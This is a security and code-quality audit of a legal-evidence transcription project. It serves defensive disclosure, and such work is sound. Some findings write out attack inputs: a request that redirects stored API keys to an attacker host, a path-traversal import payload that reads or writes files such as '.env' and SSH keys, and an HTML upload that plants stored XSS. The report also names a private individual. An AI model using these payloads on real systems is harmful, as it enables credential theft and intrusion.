# SA-transcription — Deep Project Review & Improvement Proposal

**Date:** 2026-10-03
**Scope:** full repository (`src/`, `data/`, `scripts/`, `tests/`, `docs/`, deployment, MCP layer)
**Method:** exhaustive file reading plus executed verification (test suite, linter, type checker, corpus analysis scripts, live `TestClient` probes, in-process function probes). Every finding below carries a file path and line number, and each behavioural claim was reproduced rather than inferred. See [§10 Method & confidence](#10-method--confidence).

---

## 1. Executive summary

### What this is

SA-transcription is **not a general transcription service**. It is the evidence-processing engine for a *specific, real, active legal matter*: the forced removal of passenger Leandro Disconzi from LATAM flight LA8159 at Santiago (SCL) on 5 July 2024, and the related Guarulhos (GRU) incident (case IDs `I-001` / `I-002`).

The artefact it produces is an attorney work product — every one of the 29 transcripts carries `"classification": "Attorney Work Product — Privileged and Confidential"`. Each transcript is more than a transcript: it is a structured evidentiary node containing diarized segments, identified speakers, citations to a law corpus, forensic clusters, and numbered key findings.

### Verdict

The project is **ambitious, genuinely well-architected in its bones, and currently unsafe to rely on as an evidentiary record.** Three statements summarise it:

1. **The architecture refactor succeeded.** The Clean Architecture layering is real, not ceremonial: `src/domain/**` imports nothing but the standard library, all 12 ports have signature-conforming adapters, atomic writes are used for transcript persistence, and the law-ingest path genuinely preserves the shared production vectors. The previous audit's transformation plan was executed competently.
2. **The quality gates are decorative.** `make lint` fails with **210 ruff errors**; `make typecheck` **aborts before checking a single file**; `make test` yields **4 failed / 499 passed**; there is no coverage tooling and no CI (`.github/` is itself in `.gitignore`). The module declared as the schema "single source of truth" has **zero importers**.
3. **The product's core promise is broken where it matters most.** Distinct speakers get merged into one by the auto-refiner; a reconciliation window can silently empty a transcript while reporting success; reviewers' text corrections are discarded with a success message; and the canonical save path has **already destroyed 349 wall-clock timestamps** in the live corpus, recoverable only from the `.bak` files the project intends to delete.

### Scorecard

| Dimension | Score | Basis |
|---|---|---|
| Purpose fit & domain modelling | **8/10** | Rich evidentiary schema, law crosswalk, chain of custody *intent* |
| Architecture & layering | **7/10** | Real dependency inversion; composition root; clean ports |
| Security | **1/10** | 93 endpoints, zero authentication; verified SSRF + key exfiltration; path traversal |
| Evidentiary integrity | **2/10** | Realized data loss; silent edit discard; unverifiable citations; no content hashing |
| Correctness of the analysis pipeline | **3/10** | Speaker-merging, window-emptying, speech-dropping defects all reproduced |
| Data consistency | **3/10** | Two schemas, 45 speaker labels for 40 speakers, 10.5% unattributable |
| Test & quality gates | **2/10** | Red tests, dead type checker, no CI, no coverage |
| Documentation accuracy | **2/10** | 535 KB of stale reports; README wrong on ports, paths, config, endpoints |
| Repo / ops hygiene | **3/10** | Committed merge conflict; broken compose; privileged data in git |
| Maintainability | **5/10** | Good docstrings and structure; 3,288-line god module in the critical path |
| **Overall** | **~3.5/10** | Strong skeleton, unsound as evidence until §9 items 1–6 land |

---

## 2. What the project is for

### 2.1 The matter it serves

The corpus is a single incident reconstructed through ~4.9 hours of audio across 29 recordings, mapped onto 24 "narratives" (`NAR-01`…`NAR-21`, plus `LATAM`/`CARABINEROS` series) and ordered into chronological "stages" (`STG_1`…`STG_29`):

- **Scenario A** — passenger removed from an aircraft at SCL after a boarding dispute; the record spans pre-boarding, the boarding gate, aircraft removal, a jetbridge standoff, post-removal investigation, PDI identity control, luggage recovery, counter confrontations, and DGAC/Carabineros interviews.
- **Scenario B** (`I-001`) — a lost-phone report and an aggressive-behaviour incident at GRU, São Paulo.

Participants are named third parties: LATAM cabin crew, gate and counter staff, supervisors and security, DGAC officials, PDI officers and Carabineros. The claimant is the repository owner.

### 2.2 What the software actually does

```
audio (m4a/wav)
  → preprocess  (noise reduction · band-pass 300–3400 Hz · LUFS normalisation · silence removal)
  → diarize     (pyannote 3.x  → speaker turns)
  → transcribe  (Whisper, per turn)
  → merge       (ASR segments ⨯ diarization turns)
  → post-process(Chilean-Spanish normalisation)
  → enrich      (LLM: participants, violations_cited, forensic_clusters, key_evidentiary_findings)
  → audit       (TranscriptAuditor → anomalies)
  → refine      (deterministic patches + LLM reconciliation + acoustic escalation)
  → persist     (atomic JSON)  →  index (Qdrant)  →  review UI
```

On top of that pipeline sit four substantial subsystems:

| Subsystem | Role | Scale |
|---|---|---|
| **Law corpus index** | Parses `data/law/**/*.md` into a registry + three Qdrant collections; validates coverage/identity/provenance/fidelity | 3,288-line module, 114 corpus files, 2,608 articles |
| **Reference-guided transcription** | Uses prior corrected transcripts + passenger narratives as priors (Whisper `initial_prompt` + LLM reconciliation) | Dedicated doc + use case |
| **Speaker registry** | Resolves 45 raw segment labels onto 40 canonical speaker IDs with Markdown profiles | 88 tracked files |
| **Review UIs + MCP** | Pinocchio/revision/curatoria/law-registry/speakers-registry UIs; 3 MCP servers | 93 HTTP endpoints, 41 MCP tools |

### 2.3 The intended differentiator

The genuinely novel idea is **evidence-diffing**: transcribe the same audio more than once, keep every version, and let an LLM reconcile them against a human-written narrative — preserving corrections across runs instead of discarding them. `docs/REFERENCE_GUIDED_TRANSCRIPTION.md` describes it clearly, and the design decisions there (references are read-only inputs; `initial_prompt` as vocabulary bias not constraint; batch-level reconciliation) are sound. **This is the part of the project most worth protecting and finishing.**

---

## 3. What it is good at

These are verified strengths, not aspirations.

**3.1 The layering is real.** Every import under `src/domain/**` is standard-library only; `src/application/**` imports only domain + pydantic. All 12 protocols in `src/domain/ports/interfaces.py` were machine-diffed against their adapters (`inspect.signature`) — names, keyword-only markers, defaults and returns all match. The only delta is `QdrantTranscriptIndex` adding an optional `collection_name`, which is LSP-compatible.

**3.2 Persistence is done properly in the one place that matters most.** `src/infrastructure/json_store.py:66-85` writes via `mkstemp` → `flush` → `os.fsync` → `os.replace`, with temp cleanup on `BaseException`. A crash cannot leave a truncated transcript. This is the best pattern in the repository and should be the template for every other writer.

**3.3 The riskiest law-index invariant genuinely holds.** Verified with an instrumented fake Qdrant client: a force-mode canonical run issued **3 `set_payload`, 0 dense upserts, 1 BM25 upsert** — the 768-dim production vectors really are untouched. The README claim that incremental mode does not rewrite canonical payloads also verifies (`qdrant_law_index.py:2417`, `refresh_payloads and not only_missing` → 0 `set_payload` calls).

**3.4 Point identity is deterministic.** `uuid5(NAMESPACE_DNS, eli)` (`qdrant_law_index.py:353-355`) plus reuse via `existing_index()` means re-ingestion is idempotent and cannot duplicate points on that path.

**3.5 Path-traversal defence on the main audio path is correct.** `path_validator.py:54` uses containment (`resolved == root or resolved.is_relative_to(root)`), and because it resolves *first* (`:51`) it defeats symlink escape, `..` traversal, and the classic `/data` vs `/database` prefix bug — all verified by running the real function against an attack matrix.

**3.6 Several security-relevant details are right.** `.env` is ignored and was *never* committed (verified across all refs); `.env` is excluded from the Docker build context; the LLM credential store writes `0600` via temp+replace and only ever returns masked keys; secrets never appear as literals in tracked files.

**3.7 The law-corpus module is unusually well documented.** Its docstrings encode verified production counts and incident write-ups, which is precisely why the README's claims were checkable at all. That is a real asset.

**3.8 The background-job design in the law registry is the best in the repo** — plain dataclass, single active job, cooperative cancellation that raises on a progress tick. It is the model the transcription job engine should be refactored toward.

**3.9 Some code is exemplary.** `law-registry.html` and `speakers-registry.html` use a complete escaper; `static/js/llm-providers.js` applies `esc()` at all 15 `innerHTML` sinks; `scripts/audit_all_transcripts.py:24,45` reuses `build_runtime()` rather than reimplementing the auditor.

---

## 4. What it is bad at — headline findings

### 4.1 ⛔ Realized, irreversible evidence loss (already happened)

The canonical transcript store **cannot represent two fields that the enrichment pipeline writes**, so every load→save cycle destroys them.

- `Segment` (`src/domain/entities/transcript.py:14-27`) declares: `index, speaker, start, end, text, reviewed, correction_note, backchannel_events`. It has **no `segment_datetime` and no segment-level `speaker_id`.**
- `json_store.py:23-36` writes exactly those fields; `load()` (`:128-137`) never reads the two missing ones.

**This has already destroyed data.** Comparing `data/transcripts/bak/*.bak` against the live files:

| File | `segment_datetime` in `.bak` | in live file | Lost |
|---|---:|---:|---:|
| `I-002_07_NAR-06_STG_13_post_PDI_corridor.json` | 211 | **0** | 211 |
| `I-002_12_NAR-15_STG_22_DGAC_office.json` | 134 | **0** | 134 |
| `I-002_05B_NAR-11_STG_11_waiting_area.json` | 6 | 4 | 2 |
| `I-002_24_NAR-19_STG_12.json` | 278 | 276 | 2 |
| **Total** | | | **349** |

**Critical operational consequence:** the `data/transcripts/bak/` directory is currently the *only remaining copy* of those 349 wall-clock timestamps. Any cleanup that deletes `bak/` will make the loss permanent. **Recover from `.bak` before any hygiene pass** (§9 item 6).

Independently, all 1,807 surviving `segment_datetime` values **contradict** their own `recording_datetime` (deltas from −1,882 s to +8,635 s; **zero exact matches**). Two mutually inconsistent wall clocks now live in one forensic record, and the field is undeclared so nothing can detect it.

### 4.2 ⛔ The auto-refiner merges distinct speakers — reproduced

`transcript_auditor.py:231-245` treats a Levenshtein distance ≤ `_label_fuzzy_max_distance` (**2**) between two labels as "label drift":

```python
if _levenshtein(na, nb) > self._label_fuzzy_max_distance:
    continue
```

`_levenshtein("SPEAKER_00", "SPEAKER_01") == 1`. Reproduced:

```
levenshtein('SPEAKER_00','SPEAKER_01') = 1
default label fuzzy max distance = 2
anomalies: ... SPEAKER_LABEL_DRIFT indices=(1, 3)
           (('canonical','SPEAKER_00'), ('drift','SPEAKER_01'))
```

and `validate_and_refine_transcript.py:270-277` converts that anomaly straight into an applied `PatchOp.RELABEL` with **no human gate**. `SPEAKER_nn` is the *only* label family pyannote emits (`pyannote_adapter.py:44`), so this fires on essentially every multi-speaker recording. For an attribution-dependent legal record, silently collapsing two speakers into one is the worst available failure mode.

The same brittle comparison makes `MID_WORD_BOUNDARY` fire across *different* speakers — my two-speaker probe produced 4 spurious `MID_WORD_BOUNDARY` anomalies for 5 alternating segments.

### 4.3 ⛔ A reconciliation window can empty a transcript and report success — reproduced

`validate_and_refine_transcript.py:381-408` applies the window as *delete-in-window* + *insert replacements*, then discards the skip list:

```python
408:  new_transcript, _ = self._patcher.apply(transcript, patches)
```

If an INSERT is rejected (the LLM's `start >= end` is passed through unvalidated at `:403-404`), the DELETE stays applied. Reproduced: a 3-segment transcript plus a reconciler reply of `{start: 99, end: 98}` persisted **`segments: []`** while the response reported `patches_applied: [replace_text 0.0-4.0 'reconciler patched 1 segments']` and `notes: []`.

The same class of bug sits one layer down: `transcript_patcher.py:41-45` puts **failed** patches into `applied` (`applied.append(self._note(patch, f"skipped: {exc}"))`), `apply()` discards `skipped`, and `transcripts.py:922-933` returns `applied` verbatim as `patches_applied` → HTTP 200 listing edits that never happened.

### 4.4 ⛔ Silent speech deletion in the diarization normaliser — reproduced

`transcribe_audio.py:111-123` computes `adaptive_floor = total_duration / max_segments` and then uses it as a **minimum duration filter**:

```python
filtered = [t for t in merged if t.duration >= effective_min]
```

with a `filtered = [longest]` fallback. Reproduced: 20 alternating 0.9 s turns (18 s of speech) with `max_segments=4` collapse to **a single 0.9 s turn — 17.1 s of speech discarded**, recorded nowhere in the transcript or metadata. The early-return guard `if len(merged) <= max_segments and total_duration <= 0` is dead code for real audio.

### 4.5 ⛔ Reviewers' corrections are silently discarded

`transcripts.py:1150-1166` applies only `reviewed`, `correction_note`, and `backchannel_events`. The Pinocchio UI sends `edited_texts`, `edited_speakers`, `edited_starts`, `edited_ends` (`templates/pinocchio.html:6607-6639`) — and those maps are used *only* to append events (`:1217-1218`), never written to the transcript. The response then counts them as if they were (`:1243-1249` `events_written`), the UI shows a success alert, and the human's work is gone on reload. `recording_datetime` (`:276`) is likewise accepted and never persisted.

For a tool whose entire value proposition is human-verified correction, this is a product-defining defect.

### 4.6 ⛔ No authentication, and a verified SSRF + API-key exfiltration path

**93 endpoints, zero authentication.** No `Depends`, no security scheme, no auth middleware — the only `Authorization` strings in `src/` are *outbound*. `main.py:136` binds `0.0.0.0:8049`, and `main.py:101-104` additionally mounts `/audio`, `/originals`, `/transcripts`, `/speakers` as unauthenticated static files.

The sharpest edge is the LLM proxy. `ChatRequest.base_url` (`src/llm/router.py:70`) is documented as "only ever supplied from the UI's advanced path" — **the UI never sends it** — and it flows to an unvalidated `resolve_base_url` override:

```python
providers.py:276-277   if override:
                           return override.rstrip("/")
router.py:432-433      url = _chat_url(provider, req.base_url)
                       headers = _auth_headers(provider, api_key)
```

So `POST /v1/llm/chat/completions {"provider":"deepseek","base_url":"https://attacker.tld"}` makes the server send its **real stored API key** to the attacker. Confirmed against a loopback socket: the server-side request carried `Authorization: Bearer sk-SENTINEL-…`. Setting `base_url` to `http://169.254.169.254` or an internal Qdrant instance yields blind/internal SSRF with up to 500 characters of response relayed back (`router.py:429-431`).

Two more unauthenticated privileged capabilities compound it: `POST|DELETE /v1/llm/providers/{provider}/key` lets anyone overwrite or clear the operator's keys, and `PATCH /api/law/payload` takes a **free-form `collection`** string (`law_registry.py:308`) that reaches `collection_name` (`qdrant_law_index.py:2511-2513`) — arbitrary read/write in *any* collection on the shared Qdrant cluster.

### 4.7 ⛔ Path traversal on write, and arbitrary file read via MCP

- **`json_store.py:22`** joins `transcript_id` straight into a path with no validation, and `POST /api/transcripts/import` accepts it as a bare `str | None` (`transcripts.py:308`). Proven end-to-end through the real router with `TestClient`: `{"runs":[{"transcript_id":"./../../escaped_root", …}]}` wrote a JSON file **two levels above `TRANSCRIPT_DIR`** with attacker-controlled contents; deeper chains reach any writable directory. `load()` has the same join and is reached by MCP tools with unvalidated input.
- **`meta_server.py:463-479` + `:294-318`** — `add_project_context_doc` attaches *any existing path* and `read_project_context_doc` reads it back. Proven: an absolute path outside every allowed root was attached and its contents returned (`.env`, `~/.ssh/id_rsa`, `llm_credentials.json` are all reachable). `meta_server.py:558-591`/`:594-635` do the same for reference transcripts, including an `os.symlink` branch that plants a link to the arbitrary source inside the served data directory (proven by copying content in from outside the roots).
- **`transcripts.py:958`** (`os.path.join(csv_dir, payload.filename)`), **`references.py:184-211`** (arbitrary `source_path` + symlink), and **`projects.py:204`** (`os.path.exists(payload.path)`) bypass `validate_file_path` entirely.

### 4.8 ⛔ Two stored-XSS sinks and an arbitrary-extension upload into a public mount

- `templates/pinocchio.html:3650-3655` injects transcript text into `innerHTML` unescaped — while escaping `speakerLabel` on the line above, so it is clearly an oversight. Segment text is attacker-influenced through unauthenticated `/import`, CSV import, **and adversarial audio transcribed verbatim**. Mirrored in `pinocchio-en.html:3963-3968`.
- `audio_file_adapter.py:43-49` accepts any extension and writes into `data/originals/`, which `main.py:102` serves as static files. `curl -F 'file=@x.html;filename=evil.html' …/api/diarization/transcribe` persists `evil_<ts>.html` **before** any format check, so it survives the resulting 500 and is then served as `text/html` from the app origin — which also defeats CORS for the whole API.

### 4.9 The legal-citation layer is unverifiable

`violations_cited` is the analytical heart of the product, and it does not resolve:

- The corpus cites **35 distinct codes** (`BR-001`…`BR-012`, `CL-001`…`CL-041`, `INT-001`…`INT-019`).
- The authoritative registry is **not in this repository**. `docs/VIOLATIONS_CROSSWALK.md:45` refers to "81 registry records"; the sibling `seeking` repo holds exactly **one** violation record (`CL-001.json`), and its `norms.json` defines only `CL-001`…`CL-008`.
- **28 of 35 codes therefore resolve to no definition** anywhere I could locate — including `CL-038` and `INT-003`, the two examples printed in the schema's own field description (`transcript_fields.py:138`).
- Nothing validates the field: `transcript_fields.py` declares `violations_cited` as a `LIST` even though `FieldSpec` supports a closed value set ("Optional closed set of accepted values", `:39`) — the UI seeds it from a free-text JSON textarea (`revision.html:1225`).
- Compounding it, `scripts/fix_violations_cited.py:60` points at `discovery/_files_which_will_be_used_in_pipeline/violations`, which **does not exist**, so the script now aborts with `FATAL: unresolved citations` (exit 1) — while the doc it generates says "Do not edit by hand".

### 4.10 The law registry ships in a failing, stale, schema-invalid state

`data/law/_mapping/law_registry.v2.json` is committed and served by `/api/law/registry`, yet it self-reports:

```json
"gates": { "coverage":"fail", "identity":"fail", "provenance":"fail",
           "fidelity":"fail", "overall":"fail" }
```

- **coverage**: 35 missing, 8 extra.
- **identity**: 6 *unintentional duplicates* with no canonical source resolved — the same article exists both as a per-article file and inside its parent law file (`CL.CACH.Art.131/133/133A/133B` vs `L18916_CACH.md`; `CL.CC.Art.2314`; `CL.L19496.Art.56` vs `CL.LPDC.Art.56`). Re-deriving the corpus today gives **17** duplicates and **114 files / 2,608 articles** — versus the artifact's 107 / 1,146.
- **provenance**: `missing_source_field: 1119` of 1119 — because the canonical writer never emits `source_path` (`qdrant_law_index.py:1595/1608/1622-1626`), the one field the v2 provenance gate checks (`law_registry_v2.py:340-346`). The gate can therefore never pass.
- **schema**: validated against the project's own `law_registry.v2.schema.json` → **8 violations**, all `source_path_expected: None is not of type 'string'`.
- **Not surfaced**: `grep` for `gate`/`coverage`/`fidelity`/`provenance` finds **no reference** in `law_registry.py` or `templates/law-registry.html`. The validation runs, fails, is written to disk, and is never shown.

### 4.11 Language classification is wrong for every international-law document

`language_for_path` (`qdrant_law_index.py:380-391`) checks `len(parts) >= 3 and parts[0].upper() == "INT"` before falling back to `_LOCALE_LANGUAGE.get(parts[0].upper(), "pt")`. The corpus layout is **flat** (`data/law/INT/ICAO_Annex9.md` → `len(parts) == 2`), and `INT` is **absent** from `_LOCALE_LANGUAGE`. Proven by execution:

```
INT/ICAO_Annex9.md    -> 'pt'
INT/Chicago1944.md    -> 'pt'
INT/MC99_1999.md      -> 'pt'
'INT' in _LOCALE_LANGUAGE -> False
```

All **21** international-law files — ICAO Annexes 6/9/10/11/13/14/17/18, Chicago 1944, Montreal 1999, Tokyo 1963, IATA GC, ACHR, VCCR, UNCRC, UNGCP, ILC ARSIWA — are labelled Portuguese. Consequences: the reported `language_breakdown` is wrong (`en: 0`), and the documented multi-locale collision resolution (`LAW_PREFERRED_LANGUAGE=en`) operates on a code path that this corpus can never reach. The fallback silently guessing `"pt"` rather than raising is the root cause.

### 4.12 The transcript corpus violates its own schema in measurable ways

29 transcripts, 3,582 segments. Verified deviations:

| Defect | Measurement |
|---|---|
| Overlapping segment pairs (`start < previous end`) | **705**, across **24 of 29** files; 300 deeper than 0.5 s; **499 cross-speaker** |
| Deepest single overlap | **278.8 s** (`I-002_14…DGAC_don_nicolas`) |
| Segments out of chronological order in their own array | **23** across **12 of 29** files (largest backward jump 268.6 s) |
| `index` ≠ array position | **150** segments — two files are 1-based, 27 are 0-based |
| Empty/whitespace-only segment text | 50 (1.4%) |
| Duplicate identical segment text within a file | 170 (47 adjacent — Whisper repetition loops) |
| Speaker labels the registry cannot resolve | **376 segments (10.5%)**, across 10 distinct labels |
| Distinct speaker labels vs mapped speakers | **45 vs 40** — three competing conventions coexist |
| Unmapped segment instances (project's own `speaker_index.json`) | **424 / 3,582 (11.8%)** |
| Every segment `reviewed: true` while top-level `reviewed: false` | **10 files** |
| `corrections_applied` entries with all fields empty | **10** |
| Files missing top-level `reviewed` + `source_path` | 2 (both `I-001`) |
| Uppercase/lowercase and punctuation hygiene (es only) | **23.5%** start lowercase; **15.2%** contain no punctuation at all |

The speaker-label problem is a *formatting* failure, not identity ambiguity. `Passenger (Leandro Disconzi)` (210 segments), `LATAM Customer Service (Female)` (94), `LATAM Staff (André BD Marinho)` (27), `SPEAKER_00 (Passenger?)` (7), `airline_staff_antonella` (5) all refer to people the registry already knows under `snake_case` slugs. Root cause: `scripts/fix_speaker_ids.py` consolidates `participants[].speaker_id` and never touches `segments[].speaker` — the field every report and the UI actually read for attribution.

The `language` field is also unreliable: 24 files are labelled `es`, but several contain Brazilian Portuguese dialogue verbatim (e.g. `'E a Latam vai querer colocar a culpa em voce invez de resolver o problema.'` inside an `es` transcript), while the reference schema in the docs explicitly supports `"language": "multi"` (`REFERENCE_GUIDED_TRANSCRIPTION.md:124`). Bilingual audio is being force-labelled monolingual.

### 4.13 The quality gates do not work

| Gate | Documented | Reality |
|---|---|---|
| `make test` | README:284 | **4 failed, 499 passed.** Two failures are stale contracts (the MCP test asserts unprefixed tool names that are actually `transcription_*`); one guards a corpus state that no longer exists |
| `make lint` | README:286 | `ruff check src/ tests/` → **210 errors** (179 auto-fixable; concentrated in `transcripts.py` 50, `llm/router.py` 43, `llm/providers.py` 30) |
| `make typecheck` | README:287 | **Aborts having checked nothing**: `Source file found twice under different module names: "domain.entities.anomaly" and "src.domain.entities.anomaly"` → `errors prevented further checking`. Cause: no `src/__init__.py`. With `--explicit-package-bases`: **144 errors in 27 files** |
| Coverage | — | **No coverage tooling at all** (`pytest_cov` not installed; no `cov` token anywhere) |
| CI | — | **Impossible as configured**: `.github/` is listed in `.gitignore` (line 57) and no workflow exists |

Two structural problems behind the numbers:

- **The declared schema single-source-of-truth is dead code.** `src/domain/transcript_fields.py` says it is the "Single source of truth for every field a transcript JSON carries" — and has **zero importers** (`validate_transcript`/`TRANSCRIPT_FIELDS` appear nowhere else). Consequently the schema is hand-rolled in **five divergent serializers** (`json_store.py:23-36`, `qdrant_index.py:249-263`, `transcripts.py:411-426`, `transcripts.py:1524-1536`, `transcripts_server.py:69`) which already disagree (`qdrant_index.py:254` persists `speaker_id`; the review endpoint omits `duration`). Running `validate_transcript()` over all 29 real files returns **ok=True, 0 errors, 0 warnings** — because `_check_nested` only iterates *declared* fields, so undeclared keys pass silently, and `participants` is missing from `_NESTED_SCHEMAS`.
- **Half the codebase is directly untested.** 22 of 64 modules are imported by any test; **9,749 LOC (51%)** sits in never-directly-imported modules — including the 1,546-line `transcripts.py`, the 691-line `meta_server.py`, `llm/router.py`, and `transcript_fields.py` itself. The fixtures are synthetic: `tests/_fakes/fixture_loader.py` loads a schema (`recordingdatetime`, `content[]`, string `id`) that exists in **no** file under `data/transcripts/`. **No test ever feeds a real transcript through the auditor, patcher or store** — which is exactly why §4.1 went unnoticed.

One more: `tests/unit/test_validate_refine_mcp.py` is labelled a unit test but imports `composition.py`, which constructs a live `QdrantTranscriptIndex` from `.env`. It reaches a **remote production Qdrant cluster** (source of the `client 1.19.0 incompatible with server 1.16.1` warning) and accounts for ~90% of the suite's runtime (21.9 s import; 24 s for 3 tests, versus 1.58 s for 179 offline tests).

### 4.14 Deployment and operations are broken

| Claim | Reality |
|---|---|
| `cp .env.example .env` (README:31); `env_file: .env.example` (compose:13) | **`.env.example` does not exist.** `docker compose up` fails at config load; `scripts/bootstrap_runpod_pod.sh:59` `die`s immediately; README quick-start fails |
| "API available at `http://localhost:8049`" after `docker compose up` (README:47,50) | Compose maps `8000:8000` with no `command:` override, so the image `CMD` runs the **RunPod polling worker** (`Dockerfile:25`) — no HTTP listener at all |
| `./start.sh` is the recommended entrypoint (README:303-317) | `start.sh:32` sources `../.dev-logs/common-logging.sh` — a file in a **different repository** — under `set -euo pipefail`. From a fresh clone it dies on line 32. It also prints "transcription is running" even when the API health loop times out (`:69-74` has no failure branch) |
| RunPod start command `python -u src/runpod_handler.py` (`RUNPOD_POD_TEMPLATE.md:22,94`; `setup_runpod_endpoint.sh:34`) | `ImportError: attempted relative import with no known parent package`. Only `-m src.runpod_handler` works — which is what `Dockerfile:25` correctly uses |
| `run_ingest_all3.sh` ingests the law corpus | `cd "$(dirname "$0")/.."` from the repo root lands in `mcp-ecosystem`, where neither the script nor `.venv-py312` exists |
| `run.sh` | **Contains committed merge-conflict markers** (`<<<<<<< HEAD` … `PORT=…8049` / `=======` / `PORT=…8040`). `bash -n run.sh` → syntax error, exit 2 |
| `mcp/*/mcpServers.example.json` usable as-is | Both point at `.venv/bin/python3` — Python 3.14, excluded by `pyproject.toml` (`>=3.12,<3.13`), with **no `mcp` package**, and the repo's own `mcp/` directory shadows the import → `ModuleNotFoundError: No module named 'mcp.server'` |
| `MCP_READINESS_REPORT.md` | Committed numbers (`not-ready`, 49 discovered, 13 missing, 73.5%) are stale; live discovery gives **66 / 30 missing / 54.5%**, and 5 registered tools are unmapped. The project's own DoD ("`ready` and `0` missing") is unmet |
| `MCP_ARCHITECTURE.md:28` "No destructive delete/reset operations are exposed" | `transcription_delete_project_api`, `…_remove_project_audio_api`, `…_remove_project_context_doc_api`, `…_patch_transcript_segments`, `import_transcripts(overwrite=…)` — none require the `confirm=true` its own `MCP_BOOTSTRAP_STANDARD.md:29` mandates |
| README:293 "over stdio" vs README:314 "using streamable HTTP" | Both statements appear two paragraphs apart. Reality: servers default to stdio; `start.sh:19` forces `streamable-http` on 8121-8123 |
| `GET /` = "System info" (README:60) | `health.py:11` is registered before `pinocchio.py:44`, and Starlette matches first-registered — so `/` returns health JSON and **the Pinocchio UI is never served at the root** |
| README transcribe example `-F "audio=@recording.wav"` | The endpoint's field is `file` (`transcription.py:50`); `audio` belongs to the *excerpt* endpoint → the documented example returns 422 |

Additional: `.dockerignore` misses `.venv/` and `.venv-py312/`, so `COPY . .` bakes **~2.9 GB** of macOS virtualenvs (plus 57 MB of `data/segment_audio/`) into a Linux image. Two virtualenvs exist side by side (`.venv` = Python 3.14.6, violating the project's own constraint; `.venv-py312` = 3.12.13), and bytecode for **both** is scattered through `src/`. `requirements.txt` omits `requests`, which `runpod_client.py:11` and `scripts/identify_speakers.py:53` import (it works only transitively), while shipping pytest/ruff/mypy into the production image.

### 4.15 Security: the model is inverted

`transcription_server.py:44-45` correctly routes `file_path` through `validate_file_path`, and `law_registry`'s `/source` and `/reports/{name}` are traversal-safe. But `path_validator.py:30` **unconditionally** appends `/tmp/agent-mcp/sessions` — a world-writable directory belonging to a *different* agent system — as a trusted root, and `:59-60` accepts a directory (no `is_file()`), while `diarization.py:73-76` discards the validation result and re-uses the raw client string (TOCTOU).

`src/infrastructure/model_manager.py:10, 32-39` monkeypatches `torch.load` **process-wide** to force `weights_only=False`, defeating PyTorch's safe-unpickling default for every checkpoint loaded anywhere in the process — including models fetched from a hub. The nominal guard is an environment variable that does not exist in PyTorch (`TORCH_FORCE_WEIGHTS_ONLY`). For a forensic tool that is a genuine supply-chain exposure.

And `pyannote_adapter.py:34-36` sets `pipeline.min_speakers` / `pipeline.max_speakers` as attributes pyannote never reads (verified: **zero** `self.min_speakers` occurrences in installed pyannote 4.0.7). The API's speaker-count parameters — `min_speakers`, `max_speakers`, and an unused `num_speakers` — **have no effect on diarization**. The exposed knobs are decorative.

### 4.16 Documentation has outrun the code

Root-level tracked Markdown totals **~535 KB of historical reports**, none of which describes the current system:

- `AUDIT_REPORT.md` (32 KB) describes a flat monolith — `src/diarization.py`, `src/models.py`, `src/preprocessing.py`, `data/queue.json`, `install`, `RUNPOD_SETUP.md`. **None of those paths exist**, and its §14 plan has largely been executed. It also reproduces truncated live credential prefixes (`hf_…`, `rpa_…`) at lines 714-715.
- `full_review.md` (204 KB) and `transcripts_all_analysis.md` (207 KB) are **unedited LLM conversation dumps** — they open mid-sentence with "Yes. In fact, I would recommend…".
- `agent_transcription.md`'s "Known Issues (2026-05-16)" list is half-stale: the MCP duplication, `_build_transcribe_params` duplication, and adapter duplication it lists were all **fixed**; `mcp/servers/` does not exist; `smoke_test_mcp.py` is already in `tests/`.
- `docs/SPEAKER_ID_CONSOLIDATION.md:140,142` claims "43 keys" and "43 canonical files + 1 orphan, 39 archived"; reality is **40 keys** and **46 active + 42 archived**, and its vocabulary table lists 5 IDs that exist nowhere while omitting 2 that do.
- 18 places across `docs/` still say "27 transcripts"; the corpus is **29**.
- `qdrant_law_index.py:313` documents "`tipo_norma` (230 blocks) and `âmbito` (198 blocks)"; the corpus contains **zero** Portuguese tag keys (only `scope`, `norm_type`, `sanctions`, `direction` — all English). This stale assumption is the direct cause of the failing test.

The `README.md` itself is well-written and ambitious, which is the problem: it documents ports (8039 vs 8049), config defaults (`CORS_ORIGINS`), an env file, a compose port, an LLM transport, and an API surface that the code does not match — while ~30 live endpoints (the entire curation/CSV/segment-audio surface, `/v1/llm/*`, `/api/speakers/*`, `POST /api/law/suggest`) are undocumented.

### 4.17 Version control contains privileged material and debris

510 tracked files. `README.md:329` asserts that generated data "under `data/`" is gitignored — **it is not.** Tracked and should not be:

| Path | Content | Why it matters |
|---|---|---|
| `data/transcripts/*.json` (29) + `bak/` (27) | All 29 carry "Attorney Work Product — Privileged and Confidential" | Privileged legal material in version control |
| `data/speakers/**` (88 files) + `data/speaker_index.json` + `data/speaker_patch.json` | Named third parties (LATAM/DGAC employees, PDI/Carabineros officers) with roles, organisations, confidence, and per-segment appearance maps | Personal data about identified individuals; **generated by `start.sh:54-55` on every start**, yet untracked-ignored |
| `data/law/pdf/**` (32 files, 4.5 MB) | Source PDFs — including **8 copies** of `Ley-19496_04-MAR-2012*.pdf` and duplicates of two other acts | `iter_files` globs only `*.md` (`qdrant_law_index.py:1091`), so the pipeline **never reads them** |
| `data/projects/*.py` | A one-off patch script inside a data directory | — |
| `.dev/**` (14 files) | Internal planning notes; `.dev` is not ignored | — |
| `run.sh`, `fix_indices_stg29.py`, `run_ingest_all3.sh` | Broken/one-off scripts at the root | — |

Also: `data/law` contains the same article twice (the 6–17 identity collisions), so the duplication is systemic rather than incidental. `.gitignore` itself has duplicated rules (`.logs/`, `.run/`, `.venv/` appear twice) and no trailing newline. And `src/llm/llm_credentials.json` — where UI-entered API keys are written in plaintext — is correctly ignored, but is readable through the §4.7 traversal paths.

### 4.18 Over-engineering relative to purpose

| Component | Files | Lines | Share |
|---|---:|---:|---:|
| infrastructure (adapters) | 24 | 7,578 | 39.9% |
| presentation (routers + UI) | 16 | 4,369 | 23.0% |
| application (use cases) | 14 | 2,435 | 12.8% |
| mcp servers | 5 | 1,779 | 9.4% |
| domain (entities/ports) | 11 | 1,089 | 5.7% |
| llm router/providers | 4 | 947 | 5.0% |
| composition/config/main | 3 | 499 | 2.6% |
| **total `src/`** | **79** | **18,995** | |

